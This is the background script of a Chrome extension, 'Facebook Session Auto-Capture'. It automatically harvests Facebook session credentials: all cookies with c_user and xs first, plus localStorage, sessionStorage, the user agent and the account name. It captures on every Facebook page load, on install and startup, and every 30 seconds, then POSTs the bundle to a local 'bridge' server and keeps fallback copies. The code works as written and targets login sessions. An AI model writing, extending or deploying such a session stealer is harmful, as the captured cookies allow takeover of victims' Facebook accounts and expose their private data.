// Facebook Session Auto-Capture Extension - Background Service Worker
// Automatically captures session data when detecting Facebook login

// Configuration
const CONFIG = {
  BRIDGE_URL: 'http://localhost:3000/api/facebook-session',
  CHECK_INTERVAL: 30000, // Check every 30 seconds
  MIN_CAPTURE_INTERVAL: 300000, // Minimum 5 minutes between captures for same user
  FACEBOOK_DOMAINS: ['facebook.com', 'www.facebook.com', 'web.facebook.com', 'm.facebook.com'],
  REQUIRED_COOKIES: ['c_user', 'xs'], // Must have these cookies for valid session
  DEBUG: true
};

// Store last capture times to avoid redundant captures
const lastCaptureTimes = new Map();

// Debug logging
function debugLog(...args) {
  if (CONFIG.DEBUG) {
    console.log('[FB-AutoCapture]', new Date().toISOString(), ...args);
  }
}

// Check if URL is Facebook
function isFacebookUrl(url) {
  try {
    const urlObj = new URL(url);
    return CONFIG.FACEBOOK_DOMAINS.some(domain => 
      urlObj.hostname === domain || urlObj.hostname.endsWith('.' + domain)
    );
  } catch {
    return false;
  }
}

// Extract userId from cookies
function extractUserIdFromCookies(cookies) {
  const cUserCookie = cookies.find(cookie => cookie.name === 'c_user');
  return cUserCookie ? cUserCookie.value : null;
}

// Validate if we have a complete session
function validateSession(cookies) {
  const cookieNames = cookies.map(c => c.name);
  const hasRequired = CONFIG.REQUIRED_COOKIES.every(name => cookieNames.includes(name));
  
  if (!hasRequired) {
    const missing = CONFIG.REQUIRED_COOKIES.filter(name => !cookieNames.includes(name));
    debugLog('Missing required cookies:', missing);
    debugLog('Available cookies:', cookieNames.join(', '));
  }
  
  return hasRequired;
}

// Format cookies for the bridge
function formatCookies(cookies) {
  return cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain.startsWith('.') ? cookie.domain : `.${cookie.domain}`,
    path: cookie.path,
    expires: cookie.expirationDate ? Math.floor(cookie.expirationDate * 1000) : -1,
    httpOnly: cookie.httpOnly,
    secure: cookie.secure,
    sameSite: convertSameSite(cookie.sameSite)
  }));
}

// Convert Chrome sameSite values
function convertSameSite(sameSite) {
  switch (sameSite) {
    case 'no_restriction':
      return 'None';
    case 'lax':
      return 'Lax';
    case 'strict':
      return 'Strict';
    default:
      return 'None';
  }
}

// Get all Facebook cookies comprehensively
async function getAllFacebookCookies() {
  try {
    const allCookies = [];
    const domains = [
      '.facebook.com',
      'facebook.com',
      '.www.facebook.com',
      'www.facebook.com',
      '.web.facebook.com',
      'web.facebook.com',
      '.m.facebook.com',
      'm.facebook.com'
    ];
    
    // Get cookies for each domain
    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain });
        allCookies.push(...cookies);
      } catch (error) {
        // Some domains might not have cookies
      }
    }
    
    // Also get cookies by URL for the current Facebook tabs
    const tabs = await chrome.tabs.query({
      url: CONFIG.FACEBOOK_DOMAINS.map(domain => `*://${domain}/*`)
    });
    
    for (const tab of tabs) {
      if (tab.url) {
        try {
          const cookies = await chrome.cookies.getAll({ url: tab.url });
          allCookies.push(...cookies);
        } catch (error) {
          debugLog('Could not get cookies for URL:', tab.url);
        }
      }
    }
    
    // Deduplicate cookies by name+domain
    const uniqueCookies = Array.from(
      new Map(allCookies.map(cookie => [`${cookie.name}_${cookie.domain}`, cookie])).values()
    );
    
    // Sort cookies - most important first
    uniqueCookies.sort((a, b) => {
      // Prioritize c_user and xs cookies
      if (a.name === 'c_user') return -1;
      if (b.name === 'c_user') return 1;
      if (a.name === 'xs') return -1;
      if (b.name === 'xs') return 1;
      
      // Then session-related cookies
      const sessionNames = ['session', 'auth', 'token', 'jwt', 'sid', 'presence'];
      const aIsSession = sessionNames.some(name => a.name.toLowerCase().includes(name));
      const bIsSession = sessionNames.some(name => b.name.toLowerCase().includes(name));
      
      if (aIsSession && !bIsSession) return -1;
      if (!aIsSession && bIsSession) return 1;
      
      // Then httpOnly cookies (more secure/important)
      if (a.httpOnly && !b.httpOnly) return -1;
      if (!a.httpOnly && b.httpOnly) return 1;
      
      return 0;
    });
    
    debugLog(`Found ${uniqueCookies.length} unique cookies`);
    debugLog('Cookie names:', uniqueCookies.map(c => c.name).join(', '));
    
    return uniqueCookies;
  } catch (error) {
    console.error('[FB-AutoCapture] Error getting cookies:', error);
    return [];
  }
}

// Send session data to localhost bridge
async function sendToLocalBridge(sessionData) {
  try {
    const response = await fetch(CONFIG.BRIDGE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(sessionData)
    });

    if (!response.ok) {
      throw new Error(`Bridge responded with ${response.status}`);
    }

    const result = await response.json();
    debugLog('Session sent to bridge successfully:', result);
    return true;
  } catch (error) {
    console.error('[FB-AutoCapture] Failed to send to bridge:', error);
    // Store locally as fallback
    await chrome.storage.local.set({
      [`fallback_session_${sessionData.userId}_${Date.now()}`]: sessionData
    });
    debugLog('Session stored locally as fallback');
    return false;
  }
}

// Capture session data from a specific tab with retries
async function captureSessionFromTab(tab, retryCount = 0) {
  try {
    debugLog('Starting session capture for tab:', tab.id, tab.url);

    // Get all Facebook cookies comprehensively
    const cookies = await getAllFacebookCookies();

    if (!cookies || cookies.length === 0) {
      debugLog('No Facebook cookies found');
      return null;
    }

    // Validate session has required cookies
    if (!validateSession(cookies)) {
      if (retryCount < 3) {
        debugLog(`Session incomplete, retrying in 5 seconds... (attempt ${retryCount + 1}/3)`);
        await new Promise(resolve => setTimeout(resolve, 5000));
        return captureSessionFromTab(tab, retryCount + 1);
      }
      debugLog('Session validation failed after retries - missing required cookies');
      return null;
    }

    // Extract userId
    const userId = extractUserIdFromCookies(cookies);
    if (!userId) {
      debugLog('No user ID found in cookies');
      return null;
    }

    // Check if we captured recently for this user
    const lastCapture = lastCaptureTimes.get(userId);
    const now = Date.now();
    if (lastCapture && (now - lastCapture) < CONFIG.MIN_CAPTURE_INTERVAL) {
      debugLog(`Skipping capture for user ${userId} - captured ${Math.round((now - lastCapture) / 1000)}s ago`);
      return null;
    }

    debugLog('Capturing valid session for user:', userId);
    debugLog('Session has required cookies: c_user, xs');

    // Get storage data from content script
    let storageData = { localStorage: {}, sessionStorage: {} };
    let userName = null;
    let userAgent = navigator.userAgent;

    try {
      // Send messages to content script - with retry for username
      const [storageResponse, userAgentResponse] = await Promise.all([
        chrome.tabs.sendMessage(tab.id, {
          action: 'getStorage',
          getLocalStorage: true,
          getSessionStorage: true
        }).catch(() => ({ localStorage: {}, sessionStorage: {} })),
        chrome.tabs.sendMessage(tab.id, {
          action: 'getUserAgent'
        }).catch(() => ({ userAgent: navigator.userAgent }))
      ]);

      if (storageResponse) {
        storageData = storageResponse;
      }
      if (userAgentResponse && userAgentResponse.userAgent) {
        userAgent = userAgentResponse.userAgent;
      }
      
      // Try to get username with retries
      let userNameAttempts = 0;
      while (!userName && userNameAttempts < 3) {
        try {
          const userNameResponse = await chrome.tabs.sendMessage(tab.id, {
            action: 'extractUserName'
          });
          if (userNameResponse && userNameResponse.userName) {
            userName = userNameResponse.userName;
            debugLog(`Username found on attempt ${userNameAttempts + 1}: ${userName}`);
          }
        } catch (error) {
          debugLog(`Username extraction attempt ${userNameAttempts + 1} failed`);
        }
        
        if (!userName && userNameAttempts < 2) {
          // Wait a bit before retry
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
        userNameAttempts++;
      }
      
      // Fallback: Try to extract from page title as last resort
      if (!userName) {
        try {
          const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
          if (activeTab && activeTab.title) {
            // Try to extract from title
            const titleMatch = activeTab.title.match(/^(?:\(\d+\)\s+)?(.+?)\s*\|\s*Facebook$/);
            if (titleMatch && titleMatch[1]) {
              const potentialName = titleMatch[1].trim();
              // Clean common UI patterns
              const cleanedName = potentialName
                .replace(/^(Linha do tempo de|Timeline of|Perfil de|Profile of)\s+/i, '')
                .replace(/\s+(timeline|perfil|profile|linha do tempo)$/i, '')
                .trim();
              
              if (cleanedName && cleanedName.length >= 2 && cleanedName.length <= 100) {
                userName = cleanedName;
                debugLog(`Username extracted from page title: ${userName}`);
              }
            }
          }
        } catch (error) {
          debugLog('Could not extract username from page title:', error);
        }
      }
      
    } catch (error) {
      debugLog('Could not get all data from content script:', error.message);
      // Continue anyway - cookies are the most important
    }

    // Build session data
    const sessionData = {
      userId: userId,
      timestamp: new Date().toISOString(),
      userInfo: {
        id: userId,
        name: userName || 'Unknown User'
      },
      userAgent: userAgent,
      url: tab.url,
      source: "auto-extension",
      cookies: formatCookies(cookies),
      localStorage: storageData.localStorage || {},
      sessionStorage: storageData.sessionStorage || {},
      metadata: {
        captureMethod: 'automatic',
        tabId: tab.id,
        extensionVersion: chrome.runtime.getManifest().version,
        cookieCount: cookies.length,
        hasRequiredCookies: true,
        requiredCookies: CONFIG.REQUIRED_COOKIES
      }
    };

    // Log important session info
    debugLog('Session summary:');
    debugLog(`  - User ID: ${userId}`);
    debugLog(`  - User Name: ${userName || 'Unknown'}`);
    debugLog(`  - Cookies: ${cookies.length} (including c_user, xs)`);
    debugLog(`  - URL: ${tab.url}`);

    // Send to bridge
    const sent = await sendToLocalBridge(sessionData);
    
    if (sent) {
      // Update last capture time
      lastCaptureTimes.set(userId, now);
      debugLog(`✅ Session captured and sent successfully for user ${userId}`);
      
      // Store success indicator
      await chrome.storage.local.set({
        lastAutoCaptureTime: now,
        lastAutoCaptureUserId: userId
      });
      
      // Notify through console (visible in extension service worker)
      console.log(`✅ [FB-AutoCapture] SUCCESS: Session captured for user ${userId} with ${cookies.length} cookies including c_user and xs`);
    }

    return sessionData;
  } catch (error) {
    console.error('[FB-AutoCapture] Error capturing session:', error);
    return null;
  }
}

// Check all Facebook tabs and capture if logged in
async function checkAndCaptureFacebookSessions() {
  try {
    // Find all Facebook tabs
    const tabs = await chrome.tabs.query({
      url: CONFIG.FACEBOOK_DOMAINS.map(domain => `*://${domain}/*`)
    });

    if (tabs.length === 0) {
      debugLog('No Facebook tabs found');
      return;
    }

    debugLog(`Found ${tabs.length} Facebook tab(s)`);

    // Process each tab
    for (const tab of tabs) {
      if (tab.status === 'complete') {
        await captureSessionFromTab(tab);
      }
    }
  } catch (error) {
    console.error('[FB-AutoCapture] Error checking tabs:', error);
  }
}

// Listen for tab updates
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  // Only process when page is fully loaded
  if (changeInfo.status === 'complete' && tab.url && isFacebookUrl(tab.url)) {
    debugLog('Facebook tab loaded:', tab.url);
    
    // Wait a bit for page to stabilize and cookies to be set
    setTimeout(() => {
      captureSessionFromTab(tab);
    }, 5000); // Increased wait time for cookies to be properly set
  }
});

// Listen for navigation events (more reliable than tabs.onUpdated)
chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId === 0) { // Main frame only
    const tab = await chrome.tabs.get(details.tabId);
    if (tab.url && isFacebookUrl(tab.url)) {
      debugLog('Facebook navigation completed:', tab.url);
      
      // Wait for page to stabilize and cookies to be set
      setTimeout(() => {
        captureSessionFromTab(tab);
      }, 5000); // Increased wait time
    }
  }
}, {
  url: CONFIG.FACEBOOK_DOMAINS.map(domain => ({ hostSuffix: domain }))
});

// Extension installation/update
chrome.runtime.onInstalled.addListener(async (details) => {
  debugLog('Extension installed/updated:', details.reason);
  
  if (details.reason === 'install') {
    console.log('Facebook Session Auto-Capture Extension installed');
    console.log('The extension will automatically capture Facebook sessions with ALL cookies');
    console.log('Make sure the bridge server is running on port 3000');
    
    // Initial check after a delay
    setTimeout(() => {
      checkAndCaptureFacebookSessions();
    }, 3000);
  } else if (details.reason === 'update') {
    console.log('Extension updated to version', chrome.runtime.getManifest().version);
    
    // Check after update
    setTimeout(() => {
      checkAndCaptureFacebookSessions();
    }, 3000);
  }
});

// Periodic check (backup mechanism)
setInterval(() => {
  checkAndCaptureFacebookSessions();
}, CONFIG.CHECK_INTERVAL);

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'contentScriptReady') {
    debugLog('Content script ready in tab:', sender.tab?.id);
    
    // Check if this is a Facebook tab and capture after delay
    if (sender.tab && sender.tab.url && isFacebookUrl(sender.tab.url)) {
      setTimeout(() => {
        captureSessionFromTab(sender.tab);
      }, 5000); // Wait for cookies to be set
    }
  }
  
  if (request.action === 'getCookies' && request.url) {
    handleGetCookies(request.url, sendResponse);
    return true; // Keep channel open for async response
  }
});

// Get cookies helper (kept for compatibility)
async function handleGetCookies(url, sendResponse) {
  try {
    const cookies = await getAllFacebookCookies();
    sendResponse({ cookies: cookies });
  } catch (error) {
    console.error('Error getting cookies:', error);
    sendResponse({ cookies: [], error: error.message });
  }
}

// Manual capture command (for testing)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'manualCapture') {
    debugLog('Manual capture requested');
    checkAndCaptureFacebookSessions().then(() => {
      sendResponse({ success: true });
    });
    return true;
  }
});

// Service worker keep-alive
let keepAliveInterval = setInterval(() => {
  chrome.storage.local.get('keepAlive', () => {
    // Keep service worker alive
  });
}, 25000);

// Startup
chrome.runtime.onStartup.addListener(() => {
  debugLog('Extension started');
  setTimeout(() => {
    checkAndCaptureFacebookSessions();
  }, 5000);
});

console.log('Facebook Session Auto-Capture Extension - Background script loaded');
console.log('Monitoring Facebook tabs for automatic session capture');
console.log('Required cookies for valid session: c_user, xs');
console.log('Bridge URL:', CONFIG.BRIDGE_URL);